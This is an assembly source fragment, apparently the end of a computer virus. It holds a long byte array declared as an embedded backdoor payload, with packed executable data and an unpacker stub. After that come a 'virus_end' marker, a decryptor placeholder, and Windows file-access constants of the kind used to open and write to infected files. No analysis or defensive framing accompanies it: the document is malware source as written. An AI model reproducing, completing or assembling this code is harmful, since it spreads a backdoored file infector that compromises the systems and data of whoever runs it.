db 089h,055h,0f8h,058h,087h,011h,06eh,031h,0a5h,0c3h,0e0h,046h,010h,0a9h,0cdh
db 0cbh,03ch,0ceh,08dh,0a9h,08ch,03dh,09ah,031h,099h,0f0h,02fh,037h,0a2h,00fh
db 006h,000h,092h,051h,0b7h,08bh,036h,003h,075h,0f8h,03bh,0cfh,07dh,037h,08bh
db 006h,046h,000h,000h,060h,05fh,08ah,0d0h,001h,055h,0fch,02ch,0e8h,074h,008h
db 0feh,0c8h,075h,022h,08ah,0d7h,0ebh,002h,08ah,0d3h,043h,000h,0c0h,0b5h,038h
db 0d0h,075h,00dh,066h,0c1h,0e8h,008h,0c1h,0c0h,010h,086h,0c4h,077h,0d9h,026h
db 09ah,006h,001h,0bch,088h,079h,088h,004h,004h,02dh,030h,058h,001h,0c5h,05eh
db 059h,046h,014h,074h,045h,03bh,087h,09ah,086h,040h,074h,040h,07bh,015h,018h
db 0dah,033h,005h,08dh,083h,035h,0f9h,011h,031h,086h,093h,093h,071h,063h,04dh
db 0d0h,0ebh,017h,051h,002h,000h,0ddh,008h,0f8h,083h,0ech,002h,066h,0ffh,076h
db 012h,052h,050h,0e8h,0fdh,0feh,006h,06bh,022h,05eh,059h,01ch,049h,0b6h,0fch
db 012h,0edh,03eh,058h,0b5h,043h,05fh,0d5h,015h,005h,077h,0bfh,0edh,08bh,083h
db 042h,011h,072h,0b9h,030h,0deh,05ah,0a7h,039h,084h,043h,048h,053h,0c4h,013h
db 074h,04dh,073h,04ch,026h,0a1h,05ah,07dh,04bh,008h,0c1h,093h,0a0h,018h,004h
db 0c1h,0f9h,002h,0f3h,0a5h,083h,0e1h,003h,05dh,054h,02dh,042h,07bh,004h,0fah
db 0b0h,045h,039h,0c6h,0d1h,00fh,03ah,0a1h,083h,0abh,003h,0cah,0aah,05ah,0edh
db 00eh,0b6h,078h,03bh,08eh,073h,0f2h,0f1h,0c3h,078h,047h,08fh,01bh,075h,0a0h
db 0e8h,079h,016h,0c5h,0b8h,0d5h,0ffh,047h,002h,038h,090h,033h,08ch,0f0h,032h
db 01bh,08bh,038h,096h,0d9h,06bh,0bbh,038h,04eh,08eh,0f8h,00dh,0e8h,078h,004h
db 051h,052h,056h,046h,02dh,0cfh,0e8h,021h,010h,0d8h,056h,05ch,0d3h,0d0h,0d1h
db 042h,07dh,0ech,0fbh,010h,05ah,0cbh,014h,02bh,0c8h,05eh,0a3h,052h,036h,05eh
db 057h,0fch,0a7h,0ceh,004h,0c2h,086h,07fh,0e1h,0e8h,08bh,0b5h,061h,030h,016h
db 048h,0f4h,052h,0a0h,08dh,0e9h,00ch,008h,0e8h,05ah,08dh,08bh,040h,058h,038h
db 08bh,051h,0e8h,0ech,0ffh,0d0h,010h,06fh,038h,006h,08bh,0c8h,040h,074h,074h
db 074h,04eh,0d4h,009h,05dh,012h,025h,020h,02ch,0d0h,08fh,045h,0ech,0e8h,0ebh
db 0cah,05ah,02ch,0e0h,058h,08fh,0fah,03bh,07dh,0e8h,075h,036h,0a3h,02dh,060h
db 0f9h,0ebh,011h,08bh,063h,0a8h,009h,0beh,0c7h,005h,0ffh,00fh,099h,066h,002h
db 0f0h,00ch,0c1h,0e0h,00ch,02bh,0c7h,0edh,031h,0b8h,0c6h,05eh,05eh,05ah,0e2h
db 0c8h,077h,0cfh,007h,099h,04dh,0adh,0eeh,040h,05eh,0fbh,08fh,026h,0a6h,0bch
db 051h,0bbh,032h,01bh,0c3h,05eh,05dh,039h,002h,0f2h,046h,01bh,039h,006h,074h
db 026h,068h,08eh,072h,00ch,003h,003h,0c2h,055h,044h,043h,043h,04eh,0d0h,050h
db 09eh,063h,07eh,08bh,001h,07ch,016h,0ffh,07bh,008h,050h,057h,051h,053h,0e8h
db 018h,08bh,064h,033h,071h,037h,0ffh,030h,063h,029h,06dh,02ah,038h,014h,0ebh
db 0c3h,0c1h,063h,0a5h,0adh,0b0h,018h,045h,00ch,089h,083h,0c1h,024h,071h,023h
db 0c1h,000h,01dh,08bh,083h,09eh,0f6h,046h,046h,08bh,093h,02eh,041h,0d0h,097h
db 088h,0ffh,0d2h,0a9h,09fh,088h,0aeh,093h,089h,036h,080h,07ah,075h,005h,04eh
db 074h,073h,0ebh,0e9h,000h,0dch,013h,0f4h,07dh,055h,014h,085h,0d2h,075h,002h
db 08bh,0d6h,062h,071h,0deh,0c9h,0f2h,0c7h,02ah,05dh,06bh,0fbh,04ch,0fch,026h
db 0f7h,043h,052h,063h,0deh,068h,0cch,0a9h,00ch,025h,0d4h,02dh,0e2h,046h,068h
db 0f2h,035h,0ebh,032h,0ebh,00eh,0d8h,0a9h,0cbh,022h,041h,01ch,00ch,0e0h,068h
db 040h,040h,09ah,0f6h,0f2h,038h,03eh,05ah,015h,08ah,00eh,006h,075h,089h,002h
db 0cfh,086h,0c8h,04eh,0ebh,0adh,075h,00eh,084h,05ah,0ebh,0ddh,0feh,01dh,010h
db 09eh,023h,005h,066h,092h,02fh,0edh,004h,04bh,030h,02bh,0f1h,089h,0f5h,00ch
db 074h,0aeh,01ch,03bh,04dh,00ch,041h,013h,0ceh,022h,0f3h,07eh,004h,01eh,059h
db 003h,076h,064h,060h,075h,034h,08ah,066h,028h,0ddh,019h,008h,00eh,019h,065h
db 078h,05ch,076h,05eh,078h,0ffh,00ch,0c3h,060h,0eah,08ch,04eh,03ah,0cbh,063h
db 015h,0f8h,01eh,05ch,016h,01dh,0cbh,0dbh,0c7h,03bh,0b2h,02dh,073h,01ah,005h
db 000h,000h,030h,046h,069h,06ch,065h,020h,063h,06fh,072h,072h,075h,070h,074h
db 02eh,000h,045h,06eh,074h,072h,079h,020h,050h,06fh,069h,000h,00ch,00bh,08eh
db 020h,04eh,06fh,046h,06fh,075h,06eh,064h,000h,054h,068h,024h,00bh,080h,0b8h
db 070h,072h,06fh,063h,065h,064h,075h,072h,004h,017h,0f8h,02eh,025h,073h,075h
db 06ch,064h,020h,06eh,062h,016h,0b0h,0c5h,0b3h,06ch,061h,074h,0e8h,0c2h,0bch
db 0d0h,020h,020h,074h,046h,02fh,0c5h,085h,044h,04ch,04ch,02eh,016h,0aah,085h
db 0b5h,064h,061h,06ch,060h,097h,0bch,078h,064h,05bh,061h,06eh,079h,034h,024h
db 066h,01bh,05dh,000h,0e2h,0eeh,01ah,006h,000h,000h,0b6h,075h,073h,065h,072h
db 033h,032h,000h,04dh,065h,073h,073h,061h,067h,065h,042h,06fh,078h,041h,000h
db 077h,073h,0b2h,034h,027h,0d2h,066h,07ah,00bh,0b6h,045h,06bh,06eh,065h,06ch
db 028h,04fh,0e7h,006h,045h,078h,069h,074h,050h,000h,0deh,08dh,07fh,020h,047h
db 065h,06fh,005h,035h,0c1h,06dh,048h,064h,07eh,044h,079h,08ah,001h,094h,0f3h
db 0d6h,044h,00dh,01bh,087h,0e5h,03dh,0a3h,0d2h,0f4h,048h,07dh,005h,02ch,000h
db 060h,08bh,074h,024h,024h,08bh,07ch,024h,028h,0fch,0adh,033h,0c9h,085h,0c0h
db 074h,011h,033h,0d2h,08dh,01ch,038h,0a4h,0b1h,003h,0e8h,072h,000h,000h,000h
db 073h,0f6h,03bh,0fbh,00fh,083h,085h,000h,000h,000h,053h,055h,057h,033h,0dbh
db 043h,033h,0edh,08bh,0c3h,08dh,07ch,01dh,000h,08bh,0ebh,08bh,0dfh,0e8h,051h
db 000h,000h,000h,073h,0f1h,08dh,05ch,03dh,000h,003h,0c7h,08bh,0efh,0e8h,042h
db 000h,000h,000h,073h,0e2h,05fh,05dh,05bh,02bh,0c1h,073h,009h,08bh,0c5h,0e8h
db 03dh,000h,000h,000h,0ebh,024h,0b1h,006h,0e8h,029h,000h,000h,000h,013h,0c0h
db 049h,075h,0f6h,040h,0e8h,029h,000h,000h,000h,08bh,0e8h,03dh,001h,080h,000h
db 000h,083h,0d9h,0ffh,03dh,081h,007h,000h,000h,083h,0d9h,0ffh,056h,08bh,0f7h
db 02bh,0f0h,0f3h,0a4h,05eh,041h,041h,0ebh,089h,003h,0d2h,075h,006h,092h,0adh
db 092h,003h,0d2h,042h,0c3h,033h,0c9h,041h,0e8h,0edh,0ffh,0ffh,0ffh,013h,0c9h
db 0e8h,0e6h,0ffh,0ffh,0ffh,072h,0f2h,0c3h,02bh,07ch,024h,028h,089h,07ch,024h
db 01ch,061h,0c2h,00ch,000h,000h,000h,0b4h,0f0h,000h,000h,0bch,00bh,000h,000h
db 088h,001h,000h,000h,02dh,0f7h,000h,000h,008h,0f0h,000h,000h,00ch,0f0h,000h
db 000h,000h,000h,040h,000h,000h,0f0h,000h,000h,004h,0f0h,000h,000h,0b8h,0b6h
db 0e6h,040h,0f0h,08dh,088h,079h,011h,000h,010h,089h,041h,001h,08bh,054h,024h
db 004h,08bh,052h,00ch,0c6h,002h,0e9h,083h,0c2h,005h,02bh,0cah,089h,04ah,0fch
db 033h,0c0h,0c3h,0b8h,078h,056h,034h,012h,064h,08fh,005h,000h,000h,000h,000h
db 083h,0c4h,004h,055h,053h,051h,057h,056h,052h,08dh,098h,032h,011h,000h,010h
db 08bh,053h,018h,052h,08bh,0e8h,06ah,040h,068h,000h,010h,000h,000h,0ffh,073h
db 004h,06ah,000h,08bh,04bh,010h,003h,0cah,08bh,001h,0ffh,0d0h,05ah,08bh,0f8h
db 050h,052h,08bh,033h,08bh,043h,020h,003h,0c2h,08bh,008h,089h,04bh,020h,08bh
db 043h,01ch,003h,0c2h,08bh,008h,089h,04bh,01ch,003h,0f2h,08bh,04bh,00ch,003h
db 0cah,08dh,043h,01ch,050h,057h,056h,0ffh,0d1h,05ah,058h,003h,043h,008h,08bh
db 0f8h,052h,08bh,0f0h,08bh,046h,0fch,083h,0c0h,004h,02bh,0f0h,089h,056h,008h
db 08bh,04bh,010h,089h,04eh,024h,08bh,04bh,014h,051h,089h,04eh,028h,08bh,04bh
db 00ch,089h,04eh,014h,0ffh,0d7h,089h,085h,023h,012h,000h,010h,08bh,0f0h,059h
db 05ah,003h,0cah,068h,000h,080h,000h,000h,06ah,000h,057h,0ffh,011h,08bh,0c6h
db 05ah,05eh,05fh,059h,05bh,05dh,0ffh,0e0h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h

SizeOfBackdoor		equ	($-BackdoorStart)


virus_end	equ	$
	
.code 

_main:
	Decryptor	db	1024	dup(90h)
	jmp	x_main
	
	
	FILE_ATTRIBUTE_NORMAL		equ	00000080h
	OPEN_EXISTING			equ	3
	GENERIC_READ			equ	80000000h
	GENERIC_WRITE			equ	40000000h
	INVALID_HANDLE_VALUE		equ	-1
	PAGE_READWRITE			equ	4h
	FILE_MAP_WRITE			equ	00000002h	
	FILE_SHARE_READ			equ	00000001h	
	GPTR				equ	0040h
	OPEN_ALWAYS			equ	4
	
end _main